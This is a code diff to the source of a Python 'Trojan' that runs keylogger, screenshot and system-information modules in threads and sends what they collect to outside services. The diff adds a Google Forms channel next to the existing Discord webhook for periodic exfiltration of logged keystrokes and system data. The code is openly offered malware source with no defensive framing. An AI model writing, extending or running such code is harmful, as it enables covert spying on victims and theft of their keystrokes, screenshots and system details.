@@ -11,27 +11,43 @@ from concurrent.futures import ThreadPoolExecutor
 from pathlib import Path
 from uuid import uuid4
 
-from src.modules import Discord, KeyLogger, ScreenShot, SystemInformation
+from src.modules import (
+    Discord,
+    GoogleForms,
+    KeyLogger,
+    ScreenShot,
+    SystemInformation
+)
 
 
 class Trojan:
-    def __init__(self, *, exfil_time: float, webhook: str):
+    def __init__(self, *,
+                 exfil_time: float,
+                 discord_webhook: str = None,
+                 google_forms_url: str = None):
         """Set up a Trojan composed of exploitation and exfiltration
         modules.
 
         :param exfil_time: Time in seconds to wait between periodic
             executions of the exfiltration of logged data. Set to
             None to perform a single operation.
-        :param webhook: URL to the Webhook set up on the Discord
-            server's configuration.
+        :param discord_webhook: URL of a Webhook for the Discord server.
+        :param google_forms_url: URL of a remote instance of Google
+            Forms.
         """
         self.exfil_time = exfil_time
-        self.webhook = webhook
+        self.webhook = discord_webhook
+        self.forms_url = google_forms_url
 
     @property
     def screenshot_path(self) -> str:
         """Gets a platform-dependent absolute path for the screenshot
         file."""
+
+        '''Set a random name for the screenshot file. The '.jpeg' 
+        extension is only required as a convenience for the generation 
+        of an image preview by the Discord server. It can be safely 
+        suppressed.'''
         filename = f"{str(uuid4())}.jpeg"
         if platform.system() == "Windows":
             app_data = os.path.expandvars(r"%LOCALAPPDATA%")
@@ -42,7 +58,7 @@ class Trojan:
 
     @property
     def modules(self) -> set[KeyLogger, ScreenShot, SystemInformation]:
-        """Gets a set of module instances ready for execution."""
+        """Gets a set of initialized ExploitationModule instances."""
         return {
             KeyLogger(exfil_time=self.exfil_time),
             ScreenShot(exfil_time=self.exfil_time,
@@ -54,6 +70,8 @@ class Trojan:
         with ThreadPoolExecutor() as executor:
             for module in self.modules:
                 Discord(module=module, webhook_url=self.webhook)
+                if type(module) != ScreenShot:
+                    GoogleForms(module=module, form_url=self.forms_url)
                 executor.submit(module.execute)
 
 
